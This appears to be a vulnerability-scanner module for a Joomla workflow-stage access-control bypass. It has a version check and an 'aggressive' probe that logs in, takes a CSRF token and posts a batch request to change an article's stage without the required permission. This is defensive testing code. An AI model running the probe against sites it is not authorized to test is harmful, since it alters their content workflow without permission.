from __future__ import annotations

import re
from typing import Any

from ...core.http import (
    HttpClient,
    form_encode,
    is_transport_error,
    normalize_url,
    transport_error_detail,
)
from ...core.models import Finding
from ...core.versions import parse_version_required, parse_version_safe
from .advisory import passive_core_finding, passive_only_check

CVE_ID = "CVE-2026-92223"
NAME = "Joomla core workflow stage batch ACL bypass"
COMPONENT = "Joomla core com_content batch"
AFFECTED_RULE = "Joomla 5.0.0-5.4.8 and 6.0.0-6.1.3; fixed in 5.4.9/6.1.4"
FIXED_RULE = "Update to Joomla 5.4.9, 6.1.4, or newer"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["safe", "aggressive"]
ADMIN_LOGIN = "/administrator/index.php"
BATCH_ENDPOINT = "/administrator/index.php?option=com_content&task=article.batch"
ARTICLES_LIST = "/administrator/index.php?option=com_content&view=articles"
TOKEN_RE = re.compile(r'name="([a-f0-9]{32})" value="1"|"csrf\.token":"([a-f0-9]{32})"')
BROWSER_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
SUCCESS_TEXT = "Batch process completed"
FAILURE_TEXT = "Batch process failed"
TRANSITION_TEXT = "not allowed to execute a transition"


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(version)
    if parsed is None:
        return "INCONCLUSIVE"
    if parse_version_required("5.0.0") <= parsed < parse_version_required("5.4.9"):
        return "LIKELY_VULNERABLE"
    if parse_version_required("6.0.0") <= parsed < parse_version_required("6.1.4"):
        return "LIKELY_VULNERABLE"
    if parsed < parse_version_required("5.0.0"):
        return "NOT_AFFECTED"
    return "PATCHED"


def _token(body: str) -> str | None:
    match = TOKEN_RE.search(body)
    if not match:
        return None
    return match.group(1) or match.group(2)


def _admin_login(client: HttpClient, base: str, username: str, password: str, timeout: int) -> str | None:
    page = client.get(f"{base}{ADMIN_LOGIN}", timeout=timeout)
    if is_transport_error(page):
        return None
    login_token = _token(page.get("body") or "")
    if not login_token:
        return None
    response = client.request(
        f"{base}{ADMIN_LOGIN}",
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": BROWSER_UA},
        data=form_encode(
            {
                "username": username,
                "passwd": password,
                "option": "com_login",
                "task": "login",
                "return": "aW5kZXgucGhw",
                login_token: "1",
            }
        ),
        timeout=timeout,
    )
    if is_transport_error(response):
        return None
    page = client.get(f"{base}{ADMIN_LOGIN}", timeout=timeout)
    if is_transport_error(page):
        return None
    return _token(page.get("body") or "")


def stage_title(body: str, article_id: int) -> str | None:
    """Read the workflow stage shown in the article row tooltip."""
    match = re.search(
        rf'id="workflow-{int(article_id)}".*?<strong>(.*?)</strong>',
        body or "",
        re.DOTALL,
    )
    if not match:
        return None
    title = re.sub(r"\s+", " ", match.group(1)).strip()
    return title or None


def _read_stage(client: HttpClient, base: str, article_id: int, timeout: int) -> str | None:
    response = client.get(f"{base}{ARTICLES_LIST}", timeout=timeout)
    if is_transport_error(response):
        return None
    return stage_title(response.get("body") or "", article_id)


def run_aggressive_probe(
    target_url: str,
    username: str | None = None,
    password: str | None = None,
    article_id: int | None = None,
    stage_id: int | None = None,
    timeout: int = 20,
    proxy: str | None = None,
) -> Finding:
    """Change the stage of an inaccessible article through the batch endpoint.

    The pre-fix ``batchWorkflowStage()`` sets an error when the user lacks
    ``core.admin`` on com_content but does not return, so the batch still runs
    and updates the workflow association of every selected article. The probe
    reads the stage from the article list before and after the batch.
    """
    base = normalize_url(target_url)
    if not username or not password or not article_id or not stage_id:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="BLOCKED_EXTERNAL",
            confidence="MEDIUM",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=False,
            proof_url=f"{base}{ADMIN_LOGIN}",
            detail=(
                "The workflow proof needs a Joomla user with admin access and core.manage on "
                "com_content but without core.admin, plus an article id and a target stage id. "
                "Pass --aggressive-arg username=... password=... article_id=... stage_id=... on an "
                "authorized staging site. Nothing was sent."
            ),
            action="Re-run with lab manager credentials and the seeded article/stage ids.",
        )

    client = HttpClient(timeout=timeout, proxy=proxy)
    token = _admin_login(client, base, username, password, timeout)
    if not token:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_CONFIRMED",
            confidence="MEDIUM",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=f"{base}{ADMIN_LOGIN}",
            detail="The login did not establish a session or expose a CSRF token; the batch probe was not attempted.",
            action="Verify the lab credentials and administrator login route.",
        )

    before_stage = _read_stage(client, base, int(article_id), timeout)

    data = form_encode(
        {
            "cid[]": str(int(article_id)),
            "batch[workflowstage_id]": str(int(stage_id)),
            token: "1",
        }
    )
    response = client.request(
        f"{base}{BATCH_ENDPOINT}",
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": BROWSER_UA},
        data=data,
        timeout=timeout,
    )
    if is_transport_error(response):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="ERROR",
            confidence="LOW",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=f"{base}{BATCH_ENDPOINT}",
            detail=f"The batch request failed in transit ({transport_error_detail(response)}).",
            action="Retry when the target is reachable.",
        )

    status = response.get("status", 0)
    body = response.get("body") or ""
    batch_success = SUCCESS_TEXT in body
    batch_failed = FAILURE_TEXT in body
    transition_denied = TRANSITION_TEXT in body
    after_stage = _read_stage(client, base, int(article_id), timeout)

    evidence = {
        "article_id": int(article_id),
        "stage_id": int(stage_id),
        "batch_status": status,
        "batch_success": batch_success,
        "batch_failed": batch_failed,
        "transition_denied": transition_denied,
        "before_stage": before_stage,
        "after_stage": after_stage,
    }

    if status in (401, 403) and not batch_success and not batch_failed:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="BLOCKED_EXTERNAL",
            confidence="MEDIUM",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=f"{base}{BATCH_ENDPOINT}",
            evidence=evidence,
            detail="The batch endpoint rejected the request before the workflow command (ACL or CSRF token).",
            action="Use a lab user with core.manage on com_content and no core.admin.",
        )

    if before_stage and after_stage and before_stage != after_stage:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE",
            confidence="CONFIRMED",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=f"{base}{BATCH_ENDPOINT}",
            evidence=evidence,
            detail=(
                f"The batch changed the stage of article {article_id} from '{before_stage}' to "
                f"'{after_stage}' for a user without core.admin on com_content. 5.4.9/6.1.4 return "
                "before the stage update and the batch fails."
            ),
            action="Update to Joomla 5.4.9, 6.1.4, or newer and review recent workflow stage changes.",
        )

    if batch_failed and transition_denied and before_stage == after_stage:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_AFFECTED",
            confidence="HIGH",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=f"{base}{BATCH_ENDPOINT}",
            evidence=evidence,
            detail=(
                "The batch was rejected with the transition permission error and the stage did not "
                "change, the fixed 5.4.9/6.1.4 behaviour."
            ),
            action="No action is required for this CVE if the version is 5.4.9, 6.1.4, or newer.",
        )

    if batch_success and before_stage == after_stage:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_CONFIRMED",
            confidence="MEDIUM",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=f"{base}{BATCH_ENDPOINT}",
            evidence=evidence,
            detail=(
                "The batch reported success but the article stage did not change. The target stage "
                "may be the current stage, the article may be on another list page, or the stage "
                "column could not be read."
            ),
            action="Re-run with a different stage id or open the articles list and verify the stage manually.",
        )

    if batch_success and not before_stage:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE",
            confidence="HIGH",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=f"{base}{BATCH_ENDPOINT}",
            evidence=evidence,
            detail=(
                "The batch reported success for a user without core.admin on com_content, but the "
                "article row was not visible in the list so the stage change could not be read back."
            ),
            action="Update to Joomla 5.4.9, 6.1.4, or newer and verify the stage manually.",
        )

    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="NOT_CONFIRMED",
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=True,
        exploit_ran=True,
        proof_url=f"{base}{BATCH_ENDPOINT}",
        evidence=evidence,
        detail="The batch response was neither a success nor the fixed transition rejection.",
        action="Review the response and the target workflow configuration before retrying.",
    )


def check(
    target_url: str,
    joomla_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 20,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aggressive_command: str | None = None,
    aggressive_args: dict[str, Any] | None = None,
    **kwargs: Any,
) -> Finding:
    from ...core.args import aggressive_value

    finding = passive_core_finding(
        cve=CVE_ID,
        name=NAME,
        affected_rule=AFFECTED_RULE,
        joomla_version=joomla_version,
        classify=classify_version,
        remediation=FIXED_RULE,
    )
    if finding.status == "LIKELY_VULNERABLE":
        finding.detail += (
            " Workflows must be enabled in Articles > Options > Integration, and the account must "
            "have admin access to com_content without core.admin."
        )
        finding.exploit_available = True

    if not run_exploit_check:
        return passive_only_check(finding, run_exploit_check)

    if exploit_mode == "aggressive":
        if finding.status not in {"LIKELY_VULNERABLE", "INCONCLUSIVE"}:
            finding.detail += " Aggressive proof skipped because Joomla was not detected as potentially affected."
            return finding
        result = run_aggressive_probe(
            target_url,
            username=aggressive_value(aggressive_args, aggressive_command, "username"),
            password=aggressive_value(aggressive_args, aggressive_command, "password"),
            article_id=int(aggressive_value(aggressive_args, aggressive_command, "article_id") or 0) or None,
            stage_id=int(aggressive_value(aggressive_args, aggressive_command, "stage_id") or 0) or None,
            timeout=timeout,
            proxy=proxy,
        )
        result.component_version = finding.component_version
        return result

    if exploit_mode != "safe":
        finding.detail += " This module supports safe (version-only) and aggressive (batch workflow stage) modes."
        return finding

    return passive_only_check(finding, run_exploit_check)


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID,
        "cms": "joomla",
        "name": NAME,
        "component": "Joomla core",
        "affected_rule": AFFECTED_RULE,
        "affected_joomla_versions": [">=5.0.0,<5.4.9", ">=6.0.0,<6.1.4"],
        "privileges_required": "HIGH",
        "exploit_available": True,
        "exploit_modes": EXPLOIT_MODES,
        "intrusive": INTRUSIVE,
        "vulnerability_type": "Improper Access Control",
        "module_version": "1.0.0",
        "last_reviewed": "2026-11-20",
        "updated": "2026-11-20",
        "required_detectors": [],
        "references": [
            "https://developer.joomla.org/security-centre/1090-20260910-core-improper-acl-checks-for-workflow-stage-changes.html",
            "https://www.cve.org/CVERecord?id=CVE-2026-92223",
            "https://nvd.nist.gov/vuln/detail/CVE-2026-92223",
        ],
    }
